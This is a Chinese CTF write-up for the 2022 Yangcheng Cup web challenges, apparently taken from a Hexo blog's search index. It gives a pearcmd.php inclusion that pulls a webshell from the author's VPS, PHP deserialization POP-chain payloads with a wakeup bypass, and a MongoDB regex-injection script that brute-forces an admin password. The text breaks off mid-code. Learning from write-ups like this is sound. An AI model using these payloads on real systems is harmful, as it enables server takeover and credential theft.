<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2022羊城杯-Web</title>
      <link href="/2022/09/04/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF-Web/"/>
      <url>/2022/09/04/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯"><a href="#羊城杯" class="headerlink" title="羊城杯"></a>羊城杯</h1><p>[toc]</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><blockquote><p>E:\markdown\CTF\2022比赛\0903羊城杯&gt;ciphey -t “ZMJTPM33ZEDJXZOMTOGQRZOETN4GPMOFZV4GPAGPZD2TRBYRZRMJXAOIZR2U2&#x3D;&#x3D;&#x3D;”<br>Possible plaintext: ‘flag{dae090f201091d2b916bd4b9da3e45a4}’ (y&#x2F;N): y<br>╭────────────────────────────────────────────────────────────╮<br>│ The plaintext is a Capture The Flag (CTF) Flag             │<br>│ Formats used:                                              │<br>│    caesar:                                                 │<br>│     Key: 13                                                │<br>│    base32                                                  │<br>│    utf8Plaintext: “flag{dae090f201091d2b916bd4b9da3e45a4}” │<br>╰────────────────────────────────────────────────────────────╯</p></blockquote><h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])) ? <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) : <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fliter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">     <span class="variable">$blacklist</span> = [<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;create&quot;</span>,<span class="string">&quot;install&quot;</span>,<span class="string">&quot;pear&quot;</span>];</span><br><span class="line">         <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> False;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fliter</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Noooo0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过stristr：</p><p>添加回车符%0a绕过检测(记得要在回车符之前转义，不然htaccess会报错)，system函数内可以拼接字符串绕过</p><p>pearcmd.php文件包含，题目过滤了create和install，但是还能用download，并且对<code>$_SERVER[&quot;QUERY_STRING&quot;])</code>的过滤可以通过url编码绕过</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904082808666.png" alt="image-20220904082808666"></p><p>vps上整一个1.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">下载</span><br><span class="line">?file=/usr/local/lib/php/%<span class="number">70</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">72</span>cmd.php&amp;+download+http:<span class="comment">//vps:7002/1.txt</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903184350966.png" alt="image-20220903184350966"></p><p>文件包含成功，整一个一句话木马，放进2.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/php/%<span class="number">70</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">72</span>cmd.php&amp;+download+http:<span class="comment">//vps:7002/2.txt</span></span><br></pre></td></tr></table></figure><p>下载远程文件2.txt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903184203562.png" alt="image-20220903184203562"></p><p>蚁剑连接，虚拟终端，经典的date提权，和蓝帽杯一样</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903182842310.png" alt="image-20220903182842310"></p><h2 id="step-by-step"><a href="#step-by-step" class="headerlink" title="step_by_step"></a>step_by_step</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;y1-&gt;magic();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;y1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hint</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hint杯调用&#x27;</span>;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$hey_mean_then</span>/is&quot;</span>, <span class="variable">$file</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;<span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cheng</span>();</span><br><span class="line"><span class="variable">$bbb</span> = <span class="keyword">new</span> <span class="title function_ invoke__">bei</span>();</span><br><span class="line"><span class="variable">$ccc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ddd = new cheng();</span></span><br><span class="line"><span class="comment">// $ddd-&gt;c1 = new yang();</span></span><br><span class="line"><span class="comment">// $ccc-&gt;y1 = &quot;hint&quot;;</span></span><br><span class="line"><span class="variable">$ccc</span>-&gt;y1 = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ccc</span>);</span><br><span class="line"><span class="variable">$bbb</span>-&gt;b1 = <span class="variable">$ccc</span>;</span><br><span class="line"><span class="variable">$aaa</span>-&gt;c1 = <span class="variable">$bbb</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="comment">// unserialize(serialize($aaa));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">// O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:3:&quot;bei&quot;:2:&#123;s:2:&quot;b1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;N;&#125;&#125;&#125;s:2:&quot;b2&quot;;N;&#125;&#125;</span></span><br><span class="line"><span class="comment">// O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:3:&quot;bei&quot;:2:&#123;s:2:&quot;b1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;s:7:&quot;phpinfo&quot;;&#125;s:2:&quot;b2&quot;;N;&#125;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接查看phpinfo，就可得flag，离谱啊</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903184831886.png" alt="image-20220903184831886"></p><h2 id="safepop"><a href="#safepop" class="headerlink" title="safepop"></a>safepop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="comment">// private $func = &#x27;call_user_func_array&#x27;;</span></span><br><span class="line">    <span class="comment">// private $func = &quot;phpinfo&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = [<span class="keyword">new</span> <span class="title class_">Test</span>(),<span class="string">&quot;getFlag&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;      <span class="comment">//在对象中调用一个不可访问方法</span></span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">//反序列化之前调用  需要绕过   当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;   <span class="comment">//相当于waf</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;      <span class="comment">//在对象中调用一个不可访问方法</span></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();      <span class="comment">//可能从这里获取信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//反序列化之前调用</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;      <span class="comment">//读取不可访问（protected 或 private）或不存在的属性的值时</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;       <span class="comment">//PHP get_class函数 ——返回对象所属的类名</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">        <span class="comment">// $this-&gt;p = &quot;phpinfo&quot;;  //属性不存在,触发get方法</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="string">&quot;getFlag&quot;</span>;  <span class="comment">//属性不存在,触发get方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;      <span class="comment">//属性，对应A</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// if(isset($_GET[&#x27;pop&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//     $pop = $_GET[&#x27;pop&#x27;];</span></span><br><span class="line"><span class="comment">//     $o = unserialize($pop);</span></span><br><span class="line"><span class="comment">//     throw new Exception(&quot;no pop&quot;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$aaa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>([<span class="variable">$aaa</span>,<span class="number">1</span>]);</span><br><span class="line"><span class="comment">// echo $zzz;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$yyy</span> = <span class="string">&#x27;O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:3:&quot;xxx&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:9:&quot;Funfunc&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// unserialize($yyy);</span></span><br><span class="line"><span class="variable">$zzz</span> = <span class="string">&#x27;a:2:&#123;i:0;O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;i:1;i:1;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// unserialize($zzz);</span></span><br><span class="line"><span class="comment">//查看phpinfo()   利用Fun类的call_user_func调用function</span></span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:9:&quot;Funfunc&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;   </span></span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line"><span class="comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;i:1;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>注意修改<code>O:3:&quot;Fun&quot;:1:</code>为<code>O:3:&quot;Fun&quot;:2:</code>来绕过wakeup</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903203124039.png" alt="image-20220903203124039"></p><h2 id="EzNode1"><a href="#EzNode1" class="headerlink" title="EzNode1"></a>EzNode1</h2><p>dirsearch扫描,&#x2F;login路由有登录界面</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904023404296.png" alt="image-20220904023404296"></p><p>f12查看源码，提示用户名</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904013052754.png" alt="image-20220904013052754"></p><p>使用Wappalyzer，源码为nodejs</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904085718385.png" alt="image-20220904085718385"></p><p>找到一个Mongodb注入，结合regx</p><p><a href="https://www.secpulse.com/archives/3278.html">Mongodb注入攻击 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://www.secpulse.com/archives/1916.html">HCTF2014 Writeup - SecPulse.COM | 安全脉搏</a></p><p>发现了一个不一样的回显，password的第一个字母为t</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904023623922.png" alt="image-20220904023623922"></p><p>根据<code>Are You Kidding Me?</code>结合Mongodb和regex注入攻击写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(string.printable)</span><br><span class="line"><span class="built_in">str</span> = string.ascii_lowercase+string.ascii_uppercase+string.digits+<span class="string">&#x27;~!@#$%^()_&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        data1 = <span class="string">&quot;username=administrator&amp;password[$regex]=^&quot;</span> + result + i</span><br><span class="line">        <span class="built_in">print</span>(data1)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url = <span class="string">&quot;http://3000.endpoint-15446f1451474a1ab020eac1131fbdea.dasc.buuoj.cn:81/login&quot;</span>,headers=headers,data = data1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(r.text))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;Kidding&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="built_in">print</span>(result + i)</span><br><span class="line">            result = result + i</span><br><span class="line"></span><br><span class="line"><span class="comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;thejs.session=s%3AB2nvBGFBBl6FtWWKzZjlNhZsYD4z9zyV.CB%2BIX6xIxKv%2Bw%2FFHAIb1MKBRn5olbtsmcaSlrV1zNXo&#x27;,&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;</span></span><br><span class="line"><span class="comment"># r = requests.post(url=&quot;http://3000.endpoint-e1d7ac3bc3ad4e4e939925ec0ce1bc4e.dasc.buuoj.cn:81/login&quot;,data=&quot;username=administrator&amp;password[$regex]=^1&quot;)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br></pre></td></tr></table></figure><p>回显</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904024228986.png" alt="image-20220904024228986"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">tHe_pAsSw0rd_thAt_y0u_NeVer_Kn0w</span><br></pre></td></tr></table></figure><p>然后输入密码，登录</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904024458658.png" alt="image-20220904024458658"></p><p>&#x2F;source查看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 